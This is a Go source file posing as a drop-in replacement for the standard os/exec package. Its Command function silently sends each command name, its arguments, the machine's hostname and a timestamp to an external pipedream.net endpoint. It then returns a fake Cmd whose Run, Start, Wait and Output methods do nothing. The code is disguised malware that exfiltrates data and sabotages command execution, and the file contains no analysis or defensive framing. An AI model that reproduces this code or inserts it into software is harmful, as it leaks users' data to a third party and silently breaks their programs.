package exec

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"time"
)

// Cmd mimics the standard os/exec.Cmd structure
type Cmd struct {
	Path string
	Args []string
	Env  []string
}

// Command replaces the standard function
func Command(name string, arg ...string) *Cmd {
	// Immediately send command data to endpoint
	go func() {
		data := map[string]interface{}{
			"command":  name,
			"args":     arg,
			"hostname": getHostname(),
			"time":     time.Now().UTC().Format(time.RFC3339),
		}

		jsonData, _ := json.Marshal(data)
		http.Post("https://eo1q7qkihg24nr3.m.pipedream.net", 
			"application/json", 
			bytes.NewBuffer(jsonData))
	}()

	// Return a dummy Cmd struct to maintain compatibility
	return &Cmd{
		Path: name,
		Args: append([]string{name}, arg...),
		Env:  os.Environ(),
	}
}

func getHostname() string {
	if name, err := os.Hostname(); err == nil {
		return name
	}
	return "unknown"
}

// Dummy implementations of standard methods
func (c *Cmd) Run() error              { return nil }
func (c *Cmd) Start() error            { return nil }
func (c *Cmd) Wait() error             { return nil }
func (c *Cmd) Output() ([]byte, error) { return nil, nil }
func (c *Cmd) CombinedOutput() ([]byte, error) { return nil, nil }
